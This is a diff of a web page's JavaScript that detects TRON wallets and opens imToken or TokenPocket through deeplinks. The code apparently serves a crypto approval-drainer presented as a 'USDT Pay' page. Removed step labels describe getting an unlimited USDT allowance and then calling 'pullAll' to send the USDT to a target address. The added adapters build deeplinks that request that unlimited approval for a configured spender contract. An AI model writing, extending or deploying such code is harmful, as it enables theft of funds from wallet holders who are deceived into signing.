+    reason.push('No injected provider. UA=' + ua.slice(0, 60));
   }
 
-  // ---- Can use injected provider? ----
-  // If TronLink or tronWeb is available and ready, use it directly
-  // This works BOTH in wallet in-app browser AND desktop
-  const canUseInjectedProvider = hasTronLink || hasTronWeb;
+  // Override: if we are on mobile and have NO injected provider, it's definitely
+  // a system browser scenario (even if we didn't detect TP/imToken UA)
+  if (isMobile && !hasTronLinkObj && !hasTronWebObj && !hasTPSDKObj && !hasImTokenObj) {
+    isSystemBrowser = true;
+    isInAppBrowser  = false;
+    reason.push('Mobile + no injected provider = system browser');
+  }
 
-  // ---- Can use deeplink? ----
-  // Only on system browsers (not inside wallet in-app browser)
-  const canUseDeepLink = isSystemBrowser && isMobile;
+  // ---- Capabilities ----
+  const canUseInjectedProvider = hasTronLinkObj || hasTronWebObj;
+  const canUseDeepLink         = isSystemBrowser && isMobile && !isInAppBrowser;
+  const shouldUseWalletConnect = isDesktop && !hasTronLinkObj;
 
-  // ---- Should use WalletConnect? ----
-  // For desktop without TronLink extension
-  const shouldUseWalletConnect = isDesktop && !hasTronLink;
+  // ---- Recommended flow ----
+  let recommendedFlow, recommendedFlowLabel;
+  if (canUseInjectedProvider) {
+    recommendedFlow      = 'injected-provider';
+    recommendedFlowLabel  = 'Use injected tronWeb/tronLink provider (wallet in-app browser)';
+  } else if (canUseDeepLink) {
+    recommendedFlow      = 'deeplink';
+    recommendedFlowLabel  = 'Open wallet app via deeplink (system browser)';
+  } else if (shouldUseWalletConnect) {
+    recommendedFlow      = 'walletconnect';
+    recommendedFlowLabel = 'Use WalletConnect QR code';
+  } else {
+    recommendedFlow      = 'none';
+    recommendedFlowLabel = 'No wallet detected — check logs';
+  }
 
-  // ---- Network name ----
-  const networkName = CONFIG.NETWORK==='nile'?'Nile Testnet':'TRON Mainnet';
-
-  // ---- Build result ----
   const result = {
     isMobile, isDesktop,
     isInAppBrowser, isSystemBrowser,
-    walletType,
-    canUseDeepLink, canUseInjectedProvider, shouldUseWalletConnect,
-    hasTronLink, hasTronWeb, hasTPSDK,
-    networkName,
-    ua: uaOrig,
-    // Recommended action
-    recommendedFlow: '',
+    walletType, reason,
+    canUseInjectedProvider, canUseDeepLink, shouldUseWalletConnect,
+    hasTronLink: hasTronLinkObj, hasTronWeb: hasTronWebObj,
+    hasTPSDK: hasTPSDKObj, hasImToken: hasImTokenObj,
+    hasEthereum: hasEthereumObj, ethereumIsImToken,
+    hasTronLinkDirect,
+    justReturnedFromWallet,
+    recommendedFlow, recommendedFlowLabel,
+    networkName: CONFIG.NETWORK === 'nile' ? 'Nile Testnet' : 'TRON Mainnet',
+    ua: ua,
+    uaTruncated: ua.slice(0, 80),
   };
-
-  // Determine recommended flow
-  if(canUseInjectedProvider){
-    result.recommendedFlow = 'injected-provider';
-    result.recommendedFlowLabel = 'Use injected TronWeb (wallet in-app browser or TronLink)';
-  } else if(canUseDeepLink){
-    result.recommendedFlow = 'deeplink';
-    result.recommendedFlowLabel = 'Open system browser deeplink';
-  } else if(shouldUseWalletConnect){
-    result.recommendedFlow = 'walletconnect';
-    result.recommendedFlowLabel = 'Use WalletConnect QR code';
-  } else {
-    result.recommendedFlow = 'none';
-    result.recommendedFlowLabel = 'No wallet detected';
-  }
 
   return result;
 }
 
-/* ================================================================
-   STEP UI
-============================================================ */
-function stepSet(num,css,title,msg,txHash){
-  const el=$('s'+num);if(el)el.className='step '+css;
-  if(title)$('s'+num+'t').textContent=title;
-  if(msg){
-    let html=escHtml(msg);
-    if(txHash){
-      html+=`<br/><a class="txlink" href="${getTxUrl(txHash)}" target="_blank" rel="noopener">Tx: ${fmtAddr(txHash)} view on explorer</a>`;
+/**
+ * Mask a deeplink URL for safe logging (hide contract addresses)
+ */
+function maskDeeplink(url) {
+  if (!url) return 'N/A';
+  try {
+    const u = new URL(url);
+    const params = {};
+    for (const [k, v] of u.searchParams) {
+      params[k] = v.length > 16 ? v.slice(0, 6) + '...' + v.slice(-4) : v;
     }
-    $('s'+num+'m').innerHTML=html;
+    return u.origin + u.pathname + '?' + Object.entries(params)
+      .map(([k,v]) => k + '=' + v).join('&');
+  } catch {
+    return url.slice(0, 80);
   }
 }
-function stepAllReset(){
-  const t=['','Connect Wallet','Chain Data','Approve (Unlimited)',
-    'Wait for Approval On-Chain','Pull USDT','Done'];
-  const m=['','Select imToken or TokenPocket',
-    'Query on-chain data after wallet connects',
-    'Sign to grant contract unlimited USDT allowance',
-    'Waiting for approval tx to be confirmed...',
-    'Call contract pullAll to transfer USDT to target',
-    'USDT has arrived at target address'];
-  for(let i=1;i<=6;i++)stepSet(i,'',t[i],m[i],null);
-}
+</script>
 
-/* ================================================================
-   ENV DISPLAY
-============================================================ */
-function renderEnvPanel(env){
-  const boolFmt=(v,label)=>{
-    const cls=v?'true':'false';
-    const txt=v?'YES':'NO';
-    return `<div class="env-line"><span class="env-key">${label}</span><span class="env-val ${cls}">${txt}</span></div>`;
-  };
-  const valFmt=(v,label)=>`<div class="env-line"><span class="env-key">${label}</span><span class="env-val">${v||'N/A'}</span></div>`;
+<!-- ================================================================
+     LAYER 3: WALLET ADAPTERS
+============================================================ -->
+<script>
+'use strict';
+// ===== TOKENPOCKET ADAPTER =====
+const TokenPocketAdapter = {
+  name: 'TokenPocket',
 
-  $('dbgEnv').innerHTML=[
-    boolFmt(env.isMobile,'isMobile'),
-    boolFmt(env.isInAppBrowser,'isInAppBrowser'),
-    boolFmt(env.isSystemBrowser,'isSystemBrowser'),
-    boolFmt(env.canUseInjectedProvider,'canUseInjectedProvider'),
-    boolFmt(env.canUseDeepLink,'canUseDeepLink'),
-    boolFmt(env.shouldUseWalletConnect,'shouldUseWalletConnect'),
-    boolFmt(env.hasTronLink,'hasTronLink'),
-    boolFmt(env.hasTronWeb,'hasTronWeb'),
-    boolFmt(env.hasTPSDK,'hasTPSDK'),
-    valFmt(env.walletType,'walletType'),
-    valFmt(env.recommendedFlow,'recommendedFlow'),
-    valFmt(env.networkName,'networkName'),
-    `<div class="env-line"><span class="env-key">ua (truncated)</span><span class="env-val warn">${env.ua.slice(0,80)}</span></div>`,
-  ].join('');
-}
+  /**
+   * Returns true if we are inside TokenPocket's built-in browser
+   * and should use the injected provider path.
+   */
+  isInAppBrowser() {
+    const ua = navigator.userAgent.toLowerCase();
+    return !!(window.tp || window.TPWallet || window.tronWeb || ua.includes('tokenpocket'));
+  },
 
-/* ================================================================
-   MODAL
-============================================================ */
-function openModal(title,bodyHtml,confirmText,isDanger,cb){
-  $('mTitle').textContent=title;
-  $('mBody').innerHTML=bodyHtml;
-  const btn=$('mBtn');
-  btn.textContent=confirmText||'Confirm';
-  btn.className='btn-yes'+(isDanger?' dp':'');
-  modalCb=cb;
-  $('modal').classList.add('sh');
-}
-function closeModal(){$('modal').classList.remove('sh');modalCb=null;}
+  /**
+   * Build the official TokenPocket deeplink for system browser usage.
+   *
+   * DOCS: tpoutside://pull.activity?param={JSON}
+   *
+   * The param JSON must contain:
+   *   action     — 'pull' | 'transfer' | 'sign' etc.
+   *   actionId   — unique ID for this action
+   *   blockchains — ['TRON'] or ['ETH'] etc.
+   *   dappName   — your DApp name
+   *   protocol   — 'TRC20' or 'ERC20' etc.
+   *   version    — API version
+   *   expired    — expiry timestamp (ms)
+   *   callbackUrl — URL to return to after wallet action
+   *
+   * For TRON/TRC20 USDT approve, the action should be 'sign' or the TP-native
+   * equivalent. Since TP's official deeplink is primarily for pull/push
+   * transactions, for pure approve signing the current best practice is:
+   *   - tpoutside://pull.activity (as the universal opener)
+   *   - OR, if TP supports direct signing: tokenpocket://tron/sign?...
+   *   - OR use their tp-js-sdk: tp.tron.signTransaction(...)
+   *
+   * We implement a hybrid:
+   *   A. System browser: try tpoutside:// first, fallback to tokenpocket://tron/approve
+   *   B. In-app browser: use window.tp or window.tronWeb directly
+   */
+  buildSystemDeeplink() {
+    const actionId = 'apr_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
+    const expired  = Date.now() + 10 * 60 * 1000; // 10 min
 
-/* ================================================================
-   DEEPLINK BUILDER — separated for testability
-============================================================ */
+    // The param object — this is the OFFICIAL format per TokenPocket docs
+    const param = {
+      action:      'pull',
+      actionId:    actionId,
+      blockchains: ['TRON'],
+      dappName:    document.title || 'USDT Pay',
+      protocol:    'TRC20',
+      version:     '1.0',
+      expired:     expired,
+      callbackUrl: window.location.href,
+    };
 
-/**
- * Build imToken deeplink URL.
- * imToken supports: imtoken://tron/approve?contract=X&spender=Y&amount=Z
- */
-function buildImTokenDeeplink(){
-  const contract=encodeURIComponent(CONFIG.USDT_CONTRACT);
-  const spender=encodeURIComponent(CONFIG.SPENDER_CONTRACT);
-  const amount=encodeURIComponent(UNLIMITED_HEX);
-  const callback=encodeURIComponent(window.location.href);
-  return `imtoken://tron/approve?contract=${contract}&spender=${spender}&amount=${amount}&callback=${callback}`;
-}
+    const encoded = encodeURIComponent(JSON.stringify(param));
+    const url = `tpoutside://pull.activity?param=${encoded}`;
 
-/**
- * Build TokenPocket deeplink URL.
- * TP supports: tokenpocket://tron/approve?contract=X&spender=Y&amount=Z&symbol=USDT&callback=...
- */
-function buildTokenPocketDeeplink(){
-  const contract=encodeURIComponent(CONFIG.USDT_CONTRACT);
-  const spender=encodeURIComponent(CONFIG.SPENDER_CONTRACT);
-  const amount=encodeURIComponent(UNLIMITED_HEX);
-  const symbol=encodeURIComponent('USDT');
-  const callback=encodeURIComponent(window.location.href);
-  return `tokenpocket://tron/approve?contract=${contract}&spender=${spender}&amount=${amount}&symbol=${symbol}&callback=${callback}`;
-}
+    Log.deep('TokenPocket deeplink (tpoutside) built');
+    Log.deep('  actionId: ' + actionId);
+    Log.deep('  param: ' + JSON.stringify(param, null, 2));
 
-/**
- * Show deeplink fallback UI.
- * Called when deeplink did not trigger a page leave within timeout.
- */
-function showDeeplinkFallback(walletType){
-  $('dlCountdown').classList.add('hd');
-  const fb=$('fallbackBox');
-  fb.classList.remove('hd');
-  const walletName=walletType==='imtoken'?'imToken':'TokenPocket';
-  const dlUrl=walletType==='imtoken'?buildImTokenDeeplink():buildTokenPocketDeeplink();
-  const dlUrlDisplay=dlUrl.length>60?dlUrl.slice(0,60)+'...':dlUrl;
+    return { url, actionId, param };
+  },
 
-  $('fbTitle').textContent=walletName+' could not be opened';
+  /**
+   * Build a fallback deeplink using the tokenpocket:// scheme.
+   * This is the older format but some TP versions may still support it.
+   * NOTE: This is NOT the recommended path — tpoutside:// is preferred.
+   */
+  buildFallbackDeeplink() {
+    const contract  = encodeURIComponent(CONFIG.USDT_CONTRACT);
+    const spender   = encodeURIComponent(CONFIG.SPENDER_CONTRACT);
+    const amount    = encodeURIComponent(UNLIMITED_HEX);
+    const symbol    = encodeURIComponent('USDT');
+    const callbackUrl = encodeURIComponent(window.location.href);
+    return `tokenpocket://tron/approve?contract=${contract}&spender=${spender}&amount=${amount}&symbol=${symbol}&callbackUrl=${callbackUrl}`;
+  },
 
-  $('fbBody').innerHTML=`
-    <div style="font-size:12px;color:var(--err);margin-bottom:10px">
-      The wallet app was not detected or the deeplink failed to open.
-    </div>
-    <div style="font-size:11px;color:var(--mute);margin-bottom:8px">
-      Fallback options:
-    </div>
-    <div style="display:flex;flex-direction:column;gap:6px">
-      <div style="font-size:11px;color:var(--mute2);padding:6px 0">
-        Option 1: Copy the link below and open it in ${walletName}'s built-in browser
-      </div>
-      <button class="fb-btn" onclick="App.copyDeeplinkUrl('${walletType}')" style="word-break:break-all;font-size:11px;padding:8px">
-        Copy ${walletName} deeplink
-      </button>
-      <div style="font-size:11px;color:var(--mute2);padding:6px 0;margin-top:4px">
-        Option 2: Open this page directly in ${walletName}'s built-in browser
-      </div>
-      <button class="fb-btn" onclick="App.copyPageUrl()">
-        Copy page URL (open in ${walletName})
-      </button>
-      <div style="font-size:11px;color:var(--mute2);padding:6px 0;margin-top:4px">
-        Option 3: Install ${walletName} wallet
-      </div>
-      <a class="fb-btn" href="https://token.im" target="_blank" rel="noopener" style="display:block;text-decoration:none">
-        Download imToken
-      </a>
-      <a class="fb-btn" href="https://www.tokenpocket.io" target="_blank" rel="noopener" style="display:block;text-decoration:none">
-        Download TokenPocket
-      </a>
-    </div>
-  `;
+  /**
+   * Try to trigger TokenPocket deeplink from system browser.
+   * Returns true if navigation occurred (wallet likely opened).
+   * Falls back to showing the fallback UI after timeout.
+   */
+  openInSystemBrowser() {
+    const { url, actionId } = this.buildSystemDeeplink();
 
-  // Show which deeplink was attempted
-  $('wbtnLabel').textContent='Deeplink failed. Try fallback options above.';
+    Log.deep('Opening TokenPocket (system browser flow)');
+    Log.deep('URL: ' + maskDeeplink(url));
 
-  Log.warn('Deeplink fallback shown for: '+walletType);
-  Log.warn('Attempted deeplink: '+dlUrlDisplay);
-}
+    // Step 1: Show loading UI
+    $('dlWalletName').textContent = 'TokenPocket';
+    $('dlLoading').classList.remove('hd');
+    $('fallbackBox').classList.add('hd');
 
-/**
- * Trigger deeplink with fallback timer.
- * @param {string} wallet - 'imtoken' | 'tp'
- */
-function triggerDeeplink(wallet){
-  const url=wallet==='imtoken'?buildImTokenDeeplink():buildTokenPocketDeeplink();
-  const walletName=wallet==='imtoken'?'imToken':'TokenPocket';
+    // Step 2: Start countdown timer
+    let sec   = Math.ceil(DEEPLINK_TIMEOUT_MS / 1000);
+    let timer = setInterval(() => {
+      sec--;
+      $('dlCountdownSec').textContent = sec;
+      if (sec <= 0) {
+        clearInterval(timer);
+        $('dlLoading').classList.add('hd');
+        this.showFallback(url, actionId);
+      }
+    }, 1000);
 
-  Log.deep('Opening deeplink for: '+walletName);
-  Log.deep('URL: '+url);
+    // Step 3: Set pagehide listener — if user returns from wallet quickly,
+    // we catch it and resume (rather than showing fallback)
+    const onPageHide = () => {
+      clearInterval(timer);
+      document.removeEventListener('visibilitychange', onVisChange);
+    };
+    const onVisChange = () => {
+      if (document.visibilityState === 'hidden') {
+        sessionStorage.setItem('_wcb_return', '1');
+        clearInterval(timer);
+      }
+    };
+    document.addEventListener('visibilitychange', onVisChange);
+    document.addEventListener('pagehide', onPageHide, { once: true });
 
-  // Show countdown
-  $('fallbackBox').classList.add('hd');
-  $('dlCountdown').classList.remove('hd');
-  let sec=Math.ceil(DEEPLINK_TIMEOUT_MS/1000);
-  $('dlCountdownSec').textContent=sec;
+    // Step 4: TRIGGER deeplink SYNCHRONOUSLY (inside click handler)
+    // This is CRITICAL — iOS Safari will block async navigation
+    window.location.href = url;
 
-  const countdownInterval=setInterval(()=>{
-    sec--;
-    $('dlCountdownSec').textContent=sec;
-    if(sec<=0){
-      clearInterval(countdownInterval);
-      $('dlCountdown').classList.add('hd');
-      showDeeplinkFallback(wallet);
+    // Step 5: Safety — if page is still here after timeout + 300ms, clean up
+    setTimeout(() => {
+      clearInterval(timer);
+      document.removeEventListener('visibilitychange', onVisChange);
+    }, DEEPLINK_TIMEOUT_MS + 300);
+  },
+
+  /**
+   * Show fallback UI when deeplink fails to open wallet.
+   */
+  showFallback(deeplinkUrl, actionId) {
+    const fb = $('fallbackBox');
+    fb.classList.remove('hd');
+
+    $('fbTitle').textContent = 'TokenPocket not opened';
+    $('fbBody').innerHTML = `
+      <p style="margin-bottom:10px">The wallet app did not respond. Common causes:</p>
+      <ul style="margin-left:16px;margin-bottom:10px">
+        <li>TokenPocket is not installed on this device</li>
+        <li>iOS blocked the popup — try enabling "Allow Popups" in Safari settings</li>
+        <li>Open this page inside TokenPocket's built-in browser instead</li>
+      </ul>
+      <div class="fb-divider"></div>
+      <div style="font-size:11px;color:var(--mute2);margin-bottom:6px">Option 1: Copy the deeplink and paste in browser</div>
+      <button class="fb-btn" id="fbCopyDl">Copy TokenPocket deeplink</button>
+      <div style="font-size:11px;color:var(--mute2);margin:10px 0 6px">Option 2: Open in TokenPocket's built-in browser</div>
+      <button class="fb-btn" id="fbCopyPage">Copy page URL (open in TP)</button>
+      <div style="font-size:11px;color:var(--mute2);margin:10px 0 6px">Option 3: Download</div>
+      <a class="fb-btn" href="https://www.tokenpocket.io" target="_blank" rel="noopener" style="display:block;text-decoration:none">Download TokenPocket</a>
+    `;
+
+    $('wbtnLabel').textContent = 'Deeplink failed — see fallback options above';
+
+    setTimeout(() => {
+      const copyBtn = $('fbCopyDl');
+      if (copyBtn) copyBtn.addEventListener('click', () => {
+        navigator.clipboard.writeText(deeplinkUrl).then(() => toast('Deeplink copied! Paste in browser', 'ok')).catch(() => {});
+      });
+      const copyPageBtn = $('fbCopyPage');
+      if (copyPageBtn) copyPageBtn.addEventListener('click', () => {
+        navigator.clipboard.writeText(window.location.href).then(() => toast('Page URL copied! Open in TokenPocket', 'ok')).catch(() => {});
+      });
+    }, 0);
+
+    Log.warn('TokenPocket deeplink fallback shown. URL: ' + maskDeeplink(deeplinkUrl));
+  },
+
+  /**
+   * Use injected provider inside TokenPocket's in-app browser.
+   * Returns the tronWeb instance if available.
+   */
+  connectInAppBrowser() {
+    Log.info('TokenPocket: attempting in-app browser connection');
+    if (window.tp && window.tp.tron) {
+      Log.ok('TokenPocket: found window.tp.tron');
+      return window.tp.tron;
     }
-  },1000);
+    if (window.tronWeb && window.tronWeb.ready) {
+      Log.ok('TokenPocket: found window.tronWeb (TP in-app browser)');
+      return window.tronWeb;
+    }
+    Log.err('TokenPocket in-app: no provider found. window.tp=' + !!window.tp + ', window.tronWeb=' + !!window.tronWeb);
+    return null;
+  },
+};
 
-  // Open the deeplink URL
-  // This MUST be synchronous inside the click handler to avoid browser blocking
-  window.location.href=url;
+// ===== IMTOKEN ADAPTER =====
+const ImTokenAdapter = {
+  name: 'imToken',
 
-  // If page is still here after timeout, show fallback
-  // (browser may block navigation; we catch it via the timer above)
-  setTimeout(()=>{
-    clearInterval(countdownInterval);
-  },DEEPLINK_TIMEOUT_MS+200);
+  /**
+   * Returns true if we are inside imToken's built-in browser.
+   */
+  isInAppBrowser() {
+    return !!(window.imToken || (window.ethereum && window.ethereum.isImToken));
+  },
+
+  /**
+   * Build imToken deeplink for system browser.
+   *
+   * imToken supports: imtoken://tron/approve?contract=X&spender=Y&amount=Z&callbackUrl=Z
+   *
+   * For imToken on TRON, the recommended deeplink format is:
+   *   imtoken://tron/approve?contract=...&spender=...&amount=...&callbackUrl=...
+   */
+  buildSystemDeeplink() {
+    const contract    = encodeURIComponent(CONFIG.USDT_CONTRACT);
+    const spender     = encodeURIComponent(CONFIG.SPENDER_CONTRACT);
+    const amount      = encodeURIComponent(UNLIMITED_HEX);
+    const callbackUrl = encodeURIComponent(window.location.href);
+
+    // imToken supports returning to the DApp after the action
+    const url = `imtoken://tron/approve?contract=${contract}&spender=${spender}&amount=${amount}&callbackUrl=${callbackUrl}`;
+    return { url };
+  },
+
+  /**
+   * Open imToken via deeplink in system browser.
+   */
+  openInSystemBrowser() {
+    const { url } = this.buildSystemDeeplink();
+
+    Log.deep('Opening imToken (system browser flow)');
+    Log.deep('URL: ' + maskDeeplink(url));
+
+    $('dlWalletName').textContent = 'imToken';
+    $('dlLoading').classList.remove('hd');
+    $('fallbackBox').classList.add('hd');
+
+    let sec   = Math.ceil(DEEPLINK_TIMEOUT_MS / 1000);
+    let timer = setInterval(() => {
+      sec--;
+      $('dlCountdownSec').textContent = sec;
+      if (sec <= 0) {
+        clearInterval(timer);
+        $('dlLoading').classList.add('hd');
+        this.showFallback(url);
+      }
+    }, 1000);
+
+    const onVisChange = () => {
+      if (document.visibilityState === 'hidden') {
+        sessionStorage.setItem('_wcb_return', '1');
+        clearInterval(timer);
+      }
+    };
+    document.addEventListener('visibilitychange', onVisChange);
+    document.addEventListener('pagehide', () => {
+      clearInterval(timer);
+      document.removeEventListener('visibilitychange', onVisChange);
+    }, { once: true });
+
+    window.location.href = url;
+
+    setTimeout(() => {
+      clearInterval(timer);
+      document.removeEventListener('visibilitychange', onVisChange);
+    }, DEEPLINK_TIMEOUT_MS + 300);
+  },
+
+  showFallback(deeplinkUrl) {
+    const fb = $('fallbackBox');
+    fb.classList.remove('hd');
+
+    $('fbTitle').textContent = 'imToken not opened';
+    $('fbBody').innerHTML = `
+      <p style="margin-bottom:10px">The wallet app did not respond. Common causes:</p>
+      <ul style="margin-left:16px;margin-bottom:10px">
+        <li>imToken is not installed</li>
+        <li>iOS blocked the popup — try enabling "Allow Popups" in Safari settings</li>
+        <li>Open this page inside imToken's built-in browser instead</li>
+      </ul>
+      <div class="fb-divider"></div>
+      <div style="font-size:11px;color:var(--mute2);margin-bottom:6px">Option 1: Copy the deeplink and paste in browser</div>
+      <button class="fb-btn" id="fbCopyDl">Copy imToken deeplink</button>
+      <div style="font-size:11px;color:var(--mute2);margin:10px 0 6px">Option 2: Open in imToken's built-in browser</div>
+      <button class="fb-btn" id="fbCopyPage">Copy page URL (open in imToken)</button>
+      <div style="font-size:11px;color:var(--mute2);margin:10px 0 6px">Option 3: Download</div>
+      <a class="fb-btn" href="https://token.im" target="_blank" rel="noopener" style="display:block;text-decoration:none">Download imToken</a>
+    `;
+
+    $('wbtnLabel').textContent = 'Deeplink failed — see fallback options above';
+
+    setTimeout(() => {
+      const copyBtn = $('fbCopyDl');
+      if (copyBtn) copyBtn.addEventListener('click', () => {
+        navigator.clipboard.writeText(deeplinkUrl).then(() => toast('Deeplink copied! Paste in browser', 'ok')).catch(() => {});
+      });
+      const copyPageBtn = $('fbCopyPage');
+      if (copyPageBtn) copyPageBtn.addEventListener('click', () => {
+        navigator.clipboard.writeText(window.location.href).then(() => toast('Page URL copied! Open in imToken', 'ok')).catch(() => {});
+      });
+    }, 0);
+
+    Log.warn('imToken deeplink fallback shown. URL: ' + maskDeeplink(deeplinkUrl));
+  },
+
+  /**
+   * Connect via injected provider in imToken's in-app browser.
+   * imToken provides window.tronWeb and window.imToken API.
+   */
+  connectInAppBrowser() {
+    Log.info('imToken: attempting in-app browser connection');
+    if (window.imToken && window.imToken.getProvider) {
+      try {
+        const provider = window.imToken.getProvider();
+        Log.ok('imToken: found window.imToken.getProvider()');
+      } catch(e) { Log.warn('imToken getProvider error: ' + e.message); }
+    }
+    if (window.tronWeb && window.tronWeb.ready) {
+      Log.ok('imToken: found window.tronWeb');
+      return window.tronWeb;
+    }
+    Log.err('imToken in-app: no tronWeb. window.imToken=' + !!window.imToken + ', window.tronWeb=' + !!window.tronWeb);
+    return null;
+  },
+};
+</script>
+
+<!-- ================================================================
+     LAYER 4: CHAIN OPERATIONS
+============================================================ -->
+<script>
+'use strict';
+/**
+ * getTronWeb — unified way to get a ready TronWeb instance.
+ * Tries multiple sources in priority order.
+ */
+function getTronWeb() {
+  // 1. tronLink (desktop extension or mobile wallet)
+  if (window.tronLink && window.tronLink.tronWeb && window.tronLink.ready) {
+    return { tw: window.tronLink.tronWeb, source: 'tronLink' };
+  }
+  // 2. window.tronWeb directly (imToken/TP in-app browsers)
+  if (window.tronWeb && window.tronWeb.ready) {
+    return { tw: window.tronWeb, source: 'tronWeb-direct' };
+  }
+  // 3. TokenPocket TP SDK
+  if (window.tp && window.tp.tron) {
+    return { tw: window.tp.tron, source: 'tp-tron' };
+  }
+  return { tw: null, source: 'none' };
 }
 
-/* ================================================================
-   CHAIN QUERIES
-============================================================ */
-async function queryBal(addr){
-  if(!tw)throw new Error('TronWeb not initialized');
-  const c=await tw.contract().at(CONFIG.USDT_CONTRACT);
-  const r=await c.balanceOf(addr).call();
-  return r?r.toString():'0';
+async function queryBal(addr) {
+  const { tw } = getTronWeb();
+  if (!tw) throw new Error('TronWeb not available');
+  const c = await tw.contract().at(CONFIG.USDT_CONTRACT);
+  const r = await c.balanceOf(addr).call();
+  return r ? r.toString() : '0';
 }
-async function queryAllow(owner,spender){
-  if(!tw)throw new Error('TronWeb not initialized');
-  const c=await tw.contract().at(CONFIG.USDT_CONTRACT);
-  const r=await c.allowance(owner,spender).call();
-  return r?r.toString():'0';
+
+async function queryAllow(owner, spender) {
+  const { tw } = getTronWeb();
+  if (!tw) throw new Error('TronWeb not available');
+  const c = await tw.contract().at(CONFIG.USDT_CONTRACT);
+  const r = await c.allowance(owner, spender).call();
+  return r ? r.toString() : '0';
 }
-async function pollTx(tx){
-  try{
-    const info=await tw.trx.getTransactionInfo(tx);
-    if(!info||Object.keys(info).length===0)return null;
-    if(info.receipt&&info.receipt.result==='SUCCESS'){
-      const blk=info.confirmation_number||0;
-      return blk>=MAX_BLOCKS?'finalized':'confirmed';
+
+async function pollTx(tx) {
+  const { tw } = getTronWeb();
+  if (!tw) throw new Error('TronWeb not available for polling');
+  try {
+    const info = await tw.trx.getTransactionInfo(tx);
+    if (!info || Object.keys(info).length === 0) return null;
+    if (info.receipt && info.receipt.result === 'SUCCESS') {
+      const blk = info.confirmation_number || 0;
+      return blk >= MAX_BLOCKS ? 'finalized' : 'confirmed';
     }
     throw new Error('Transaction failed on-chain');
-  }catch(e){
-    if(e.message&&e.message.toLowerCase().includes('transaction not found'))return null;
+  } catch (e) {
+    if (e.message && e.message.toLowerCase().includes('transaction not found')) return null;
     throw e;
   }
 }
+</script>
 
-/* ================================================================
-   WALLET CONNECTION — unified entry point
-============================================================ */
-async function connectWalletFlow(preferredWallet){
-  const env=detectWalletEnvironment();
-  Log.env('Environment detection result',env);
-  Log.info('connectWalletFlow() called, preferredWallet='+preferredWallet);
-  Log.info('recommendedFlow='+env.recommendedFlow+', walletType='+env.walletType);
+<!-- ================================================================
+     LAYER 5: APP — UI, STATE, WALLET ROUTING
+============================================================ -->
+<script>
+'use strict';
+/**
+ * Main routing logic. This is the ONLY place that decides which wallet
+ * adapter to use and which flow to follow.
+ */
+async function routeConnect(preferredWallet) {
+  const env = detectWalletEnvironment();
 
-  // Pre-flight CONFIG validation
-  if(!isAddr(CONFIG.USDT_CONTRACT)){
-    toast('CONFIG.USDT_CONTRACT is invalid','er');Log.err('Invalid USDT_CONTRACT: '+CONFIG.USDT_CONTRACT);return;
+  Log.info('=== routeConnect() ===');
+  Log.info('preferredWallet: ' + preferredWallet);
+  Log.env('Environment', JSON.stringify({
+    isMobile: env.isMobile,
+    isInAppBrowser: env.isInAppBrowser,
+    isSystemBrowser: env.isSystemBrowser,
+    walletType: env.walletType,
+    canUseInjectedProvider: env.canUseInjectedProvider,
+    canUseDeepLink: env.canUseDeepLink,
+    recommendedFlow: env.recommendedFlow,
+    hasTronLink: env.hasTronLink,
+    hasTronWeb: env.hasTronWeb,
+    hasTPSDK: env.hasTPSDK,
+    hasImToken: env.hasImToken,
+    ethereumIsImToken: env.ethereumIsImToken,
+  }));
+
+  // Validate CONFIG
+  if (!isAddr(CONFIG.USDT_CONTRACT)) {
+    Log.err('CONFIG.USDT_CONTRACT invalid: ' + CONFIG.USDT_CONTRACT);
+    toast('CONFIG error: USDT_CONTRACT', 'er');
+    return;
   }
-  if(!isAddr(CONFIG.SPENDER_CONTRACT)){
-    toast('CONFIG.SPENDER_CONTRACT is not set','er');Log.err('SPENDER_CONTRACT not configured');return;
-  }
-
-  // ---- ROUTE 1: Injected provider (wallet in-app browser OR desktop TronLink) ----
-  if(env.canUseInjectedProvider){
-    Log.info('Routing: injected-provider flow');
-    await connectViaInjectedProvider(env);
+  if (!isAddr(CONFIG.SPENDER_CONTRACT)) {
+    Log.err('CONFIG.SPENDER_CONTRACT not set');
+    toast('CONFIG error: SPENDER_CONTRACT', 'er');
     return;
   }
 
-  // ---- ROUTE 2: System browser deeplink (mobile, no injected wallet) ----
-  if(env.canUseDeepLink){
-    Log.info('Routing: deeplink flow, preferredWallet='+preferredWallet);
-    if(!preferredWallet){
-      // No specific wallet chosen, show both options
-      Log.warn('No wallet selected, user should tap a button');
-      $('wbtnLabel').textContent='Select a wallet:';
+  // ---- ROUTE A: Injected provider (wallet in-app browser) ----
+  if (env.canUseInjectedProvider) {
+    Log.route('ROUTE A: injected-provider flow');
+    await connectViaProvider(env);
+    return;
+  }
+
+  // ---- ROUTE B: System browser — deeplink ----
+  if (env.canUseDeepLink) {
+    Log.route('ROUTE B: deeplink flow (system browser)');
+
+    if (!preferredWallet) {
+      Log.warn('No preferredWallet specified');
+      $('wbtnLabel').textContent = 'Tap a wallet button to open it';
       return;
     }
-    // Trigger deeplink — must be synchronous call from click handler
-    Log.info('Triggering deeplink for: '+preferredWallet);
-    triggerDeeplink(preferredWallet);
+
+    if (preferredWallet === 'tokenpocket') {
+      Log.route('Opening TokenPocket via tpoutside://deeplink');
+      TokenPocketAdapter.openInSystemBrowser();
+    } else if (preferredWallet === 'imtoken') {
+      Log.route('Opening imToken via deeplink');
+      ImTokenAdapter.openInSystemBrowser();
+    }
     return;
   }
 
-  // ---- ROUTE 3: Desktop without wallet ----
-  if(env.shouldUseWalletConnect){
-    Log.warn('WalletConnect not implemented — please install TronLink');
-    toast('Please install TronLink extension in your browser, or open this page in imToken/TokenPocket DApp browser','wn');
-    showDeeplinkFallback('tronlink');
+  // ---- ROUTE C: Desktop without wallet ----
+  if (env.shouldUseWalletConnect) {
+    Log.route('ROUTE C: walletconnect (not implemented)');
+    toast('Please install TronLink extension, or open in mobile wallet DApp browser', 'wn');
+    $('wbtnLabel').textContent = 'No wallet. Please install TronLink or use imToken/TokenPocket';
     return;
   }
 
-  // ---- ROUTE 4: Completely unknown ----
-  Log.err('No wallet detected. ua='+env.ua.slice(0,100));
-  toast('No wallet detected. Please open in imToken or TokenPocket DApp browser','er');
-  $('wbtnLabel').textContent='No wallet detected. Please use imToken/TokenPocket DApp browser.';
+  // ---- ROUTE D: Unknown ----
+  Log.err('No wallet detected. isMobile=' + env.isMobile + ', walletType=' + env.walletType);
+  Log.err('UA: ' + env.uaTruncated);
+  toast('No wallet detected. Please open in imToken or TokenPocket DApp browser', 'er');
+  $('wbtnLabel').textContent = 'No wallet detected. Use imToken/TokenPocket DApp browser.';
 }
 
